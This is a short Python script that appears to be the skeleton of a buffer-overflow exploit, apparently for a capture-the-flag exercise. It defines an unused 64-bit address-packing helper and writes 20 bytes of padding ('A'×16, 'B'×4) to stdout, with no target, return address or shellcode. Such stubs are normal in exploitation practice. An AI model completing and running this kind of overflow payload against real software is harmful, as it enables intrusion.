import struct
import sys


def p(x):
    return struct.pack('<Q', x)



payload = ""

payload += "A" * 16 + "B" * 4


sys.stdout.write(payload)
